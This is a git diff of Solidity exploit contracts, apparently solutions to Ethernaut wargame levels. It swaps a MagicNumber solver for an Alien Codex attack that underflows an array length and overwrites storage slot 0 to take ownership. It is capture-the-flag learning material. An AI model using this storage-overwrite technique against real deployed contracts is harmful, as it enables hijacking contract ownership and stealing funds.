@@ -1,39 +1,36 @@
 // SPDX-License-Identifier: WTFPL
 pragma solidity 0.8.7;
 
-error Hack__NoContractAddress();
+interface IAlienCodex {
+    function retract() external;
 
+    function make_contact() external;
+
+    function revise(uint256 i, bytes32 _content) external;
+}
+
+//        make_contact false | owner address
+// 0x000000000000000000000000|40055e69e7eb12620c8ccbccab1f187883301c30 slot 0
+//                                          length of the array codex
+// 0x0000000000000000000000000000000000000000000000000000000000000001 slot 1
+// How I can get the element in the slot ? keccak256(slot) + index
 contract Hack {
-    address contractAddress;
+    IAlienCodex alien;
 
-    constructor(address magicAddress) {
-        // The creation bytecode, you can find in README.md
-        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
-        address deployAddress;
-        assembly {
-            deployAddress := create(0, add(bytecode, 0x20), 0x13)
-            /** The first argument is the amount, in our case equal to zero
-             * Second argument is we ignore the first 32 bytes  in hex 20
-             * third argument  is the size 19 bytes in hex is 13
-             */
-        }
-        contractAddress = deployAddress;
-        IMagic(magicAddress).setSolver(deployAddress);
+    constructor(address contractAddress) {
+        alien = IAlienCodex(contractAddress);
+        // We need pass the modifier
+        alien.make_contact();
+        //         Make contact true | owner address
+        // 0x000000000000000000000001|40055e69e7eb12620c8ccbccab1f187883301c30 slot 0
     }
 
-    function checkMagicNumber() public view returns (uint256) {
-        if (contractAddress == address(0)) {
-            revert Hack__NoContractAddress();
-        }
-        uint256 magicNumber = IMagicNum(contractAddress).whatIsTheMeaningOfLife();
-        return magicNumber;
+    function attack() public {
+        alien.retract();
+        // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+        uint256 index = type(uint256).max - uint256(keccak256(abi.encode(uint256(1)))) + 1;
+
+        // 0x000000000000000000000000<ADDRESS_SENDER>
+        alien.revise(index, bytes32(uint256(uint160(msg.sender))));
     }
-}
-
-interface IMagicNum {
-    function whatIsTheMeaningOfLife() external view returns (uint);
-}
-
-interface IMagic {
-    function setSolver(address _solver) external;
 }
